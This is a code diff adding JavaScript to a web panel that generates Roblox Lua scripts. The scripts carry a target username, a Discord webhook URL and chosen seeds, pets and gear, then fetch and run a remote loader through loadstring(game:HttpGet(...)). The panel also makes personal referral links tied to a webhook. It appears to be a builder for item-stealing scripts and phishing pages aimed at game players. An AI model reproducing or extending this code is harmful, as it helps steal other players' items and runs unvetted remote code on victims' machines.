+        function setGagMode(mode){gagCurrentMode=mode;['normal','custom'].forEach(m=>document.getElementById(`gag-btn-${m}`).classList.toggle('active',m===mode));document.getElementById('gag-custom-section').classList.toggle('hidden',mode!=='custom');}
+
+        async function generateGagScript(){
+            const btnText=document.getElementById('gag-gen-text'),output=document.getElementById('gag-output-section'),display=document.getElementById('gag-script-display');
+            const nTarget=document.getElementById('gag-normal-target').value.trim(),nWebhook=document.getElementById('gag-normal-webhook').value.trim();
+            const sT=Array.from(gagSelectedSeeds).map(s=>`    ["${s}"] = true`).join(',\n'),pT=Array.from(gagSelectedPets).map(p=>`    ["${p}"] = true`).join(',\n'),gT=Array.from(gagSelectedGears).map(g=>`    ["${g}"] = true`).join(',\n'),prT=Array.from(gagSelectedProps).map(p=>`    ["${p}"] = true`).join(',\n');
+            const scriptUrl='https://api.luarmor.net/files/v4/loaders/22c796a75f035b5ef8e55946d39e602c.lua';
+            const cLS=gagCurrentMode==='custom'?(document.getElementById('gag-custom-loadstring').value.trim()):'';
+            const gagMain=`loadstring(game:HttpGet("${scriptUrl}"))()`;
+            const cB=cLS?`task.spawn(function()\ntask.spawn(function()\n${gagMain}\nend)\n\ntask.wait(1)\n\n${cLS}\nend)`:gagMain;
+            const fs=`getgenv().NORMAL_TARGET     = "${nTarget}"\ngetgenv().NORMAL_WEBHOOK_URL = "${nWebhook}"\ngetgenv().NORMAL_SEEDS = {\n${sT}\n}\ngetgenv().NORMAL_PETS = {\n${pT}\n}\ngetgenv().NORMAL_GEARS = {\n${gT}\n}\ngetgenv().NORMAL_PROPS = {\n${prT}\n}\n${cB}`;
+            output.classList.remove('hidden');
+            if(document.getElementById('gag-loadstring-toggle').checked){
+                btnText.textContent='GENERATING...';display.textContent='-- Connecting to server...';
+                try{
+                    const res=await fetch('/api/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({script:fs,provider:'kryovex'})});
+                    const d=await res.json();
+                    display.textContent=res.ok&&d.url?`loadstring(game:HttpGet("${d.url}"))()` :'-- Error: Server response not OK';
+                }catch(e){display.textContent='-- Error: Request failed';}
+                btnText.textContent='GENERATE SCRIPT';
+            }else{display.textContent=fs;}
+        }
+
+        checkSession();createPills();createSkinPills();createGearPills();
+    </script>
+
+    <script>
+        function generateFallbackCode(){
+            const chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code='';
+            for(let i=0;i<8;i++)code+=chars[Math.floor(Math.random()*chars.length)];
+            return code;
+        }
+
+        async function createRefSite(){
+            const u=document.getElementById('ref-roblox-input').value.trim(),w=document.getElementById('ref-webhook-input').value.trim();
+            const btn=document.getElementById('create-ref-text'),err=document.getElementById('ref-error'),errMsg=document.getElementById('ref-error-msg');
+            err.classList.add('hidden');document.getElementById('ref-output').classList.add('hidden');
+            if(!u){errMsg.textContent='Enter a valid Roblox username';err.classList.remove('hidden');return;}
+            if(!w.startsWith('https://discord.com/api/webhooks/')&&!w.startsWith('https://discordapp.com/api/webhooks/')){errMsg.textContent='Enter a valid Discord webhook URL';err.classList.remove('hidden');return;}
+            btn.textContent='GENERATING...';
+            let code='';
+            try{
+                const res=await fetch(`${RUBIS_REF_API}/create`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,webhook:w})});
+                if(res.ok){
+                    const data=await res.json();
+                    code=data.code||data.id||data.slug||'';
+                }
+            }catch(_){}
+            if(!code){
+                code=generateFallbackCode();
+                try{localStorage.setItem('kryovex_ref_'+code,JSON.stringify({username:u,webhook:w}));}catch(_){}
+            }
+            document.getElementById('ref-link-display').value=`https://automoreira.xyz/r/${code}`;
+            document.getElementById('ref-output').classList.remove('hidden');
+            btn.textContent='GENERATE MY SITE';
+        }
+        function copyRefLink(){const v=document.getElementById('ref-link-display').value,b=document.getElementById('ref-copy-btn');navigator.clipboard.writeText(v).then(()=>{b.textContent='COPIED!';setTimeout(()=>b.textContent='COPY',1500);}).catch(()=>{});}
+    </script>
+</body>
+</html>
